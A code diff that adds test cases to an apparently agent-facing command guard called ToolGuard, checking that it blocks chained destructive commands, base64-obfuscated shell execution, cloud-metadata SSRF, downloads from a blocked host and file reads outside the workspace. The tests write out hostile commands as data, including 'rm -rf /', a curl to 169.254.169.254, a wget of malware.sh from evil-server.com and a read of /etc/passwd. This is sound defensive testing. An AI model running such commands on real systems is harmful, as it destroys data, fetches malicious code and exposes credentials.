@@ -186,4 +186,87 @@ describe('ToolGuard Security Engine', () => {
       assert.deepStrictEqual(tokens, ['npm', 'test']);
     });
   });
+
+  describe('Phase 3: AST & Chained Command Parsing', () => {
+    it('should BLOCK chained commands containing destructive segments (&&)', () => {
+      const result = engine.evaluate('echo "build ok" && rm -rf /');
+      assert.strictEqual(result.verdict, 'BLOCK');
+      assert.ok(result.reason.includes('rm -rf /'));
+    });
+
+    it('should BLOCK chained commands using semicolon (;)', () => {
+      const result = engine.evaluate('npm test ; DROP DATABASE production;');
+      assert.strictEqual(result.verdict, 'BLOCK');
+    });
+
+    it('should ALLOW safe chained read-only commands', () => {
+      const result = engine.evaluate('git status && npm test');
+      assert.strictEqual(result.verdict, 'ALLOW');
+    });
+
+    it('should BLOCK obfuscated base64 decoded shell execution', () => {
+      const result = engine.evaluate('echo cm0gLXJmIC8= | base64 -d | sh');
+      assert.strictEqual(result.verdict, 'BLOCK');
+      assert.strictEqual(result.risk, 'CRITICAL');
+    });
+
+    it('should strip environment prefixes and BLOCK destructive commands', () => {
+      const result = engine.evaluate('NODE_ENV=production DEBIAN_FRONTEND=noninteractive rm -rf /');
+      assert.strictEqual(result.verdict, 'BLOCK');
+    });
+  });
+
+  describe('Phase 3: Network SSRF & Domain Guard', () => {
+    it('should BLOCK attempts to query cloud instance metadata (SSRF)', () => {
+      const result = engine.evaluate('curl http://169.254.169.254/latest/meta-data/');
+      assert.strictEqual(result.verdict, 'BLOCK');
+      assert.strictEqual(result.risk, 'CRITICAL');
+      assert.ok(result.reason.includes('Metadata Service'));
+    });
+
+    it('should BLOCK explicitly blocked domains', () => {
+      const netEngine = new ToolGuardEngine({
+        network: {
+          blockedDomains: ['evil-server.com']
+        }
+      });
+      const result = netEngine.evaluate('wget https://evil-server.com/malware.sh');
+      assert.strictEqual(result.verdict, 'BLOCK');
+      assert.ok(result.reason.includes('evil-server.com'));
+    });
+
+    it('should enforce strict allowed outbound domain whitelist', () => {
+      const netEngine = new ToolGuardEngine({
+        network: {
+          allowedDomains: ['github.com', 'registry.npmjs.org']
+        }
+      });
+      const allowedResult = netEngine.evaluate('curl https://api.github.com/repos');
+      assert.notStrictEqual(allowedResult.verdict, 'BLOCK');
+
+      const blockedResult = netEngine.evaluate('curl https://untrusted-api.org/data');
+      assert.strictEqual(blockedResult.verdict, 'BLOCK');
+    });
+  });
+
+  describe('Phase 3: Workspace Boundary Sandboxing', () => {
+    it('should BLOCK file operations targeting paths outside workspace', () => {
+      const sandboxedEngine = new ToolGuardEngine({
+        sandboxWorkspace: true,
+        workspaceRoot: '/Users/navdeep/project'
+      });
+
+      const insideResult = sandboxedEngine.evaluate({
+        toolName: 'read_file',
+        targetPath: '/Users/navdeep/project/src/index.ts'
+      });
+      assert.strictEqual(insideResult.verdict, 'ALLOW');
+
+      const outsideResult = sandboxedEngine.evaluate({
+        toolName: 'read_file',
+        targetPath: '/etc/passwd'
+      });
+      assert.strictEqual(outsideResult.verdict, 'BLOCK');
+    });
+  });
 });
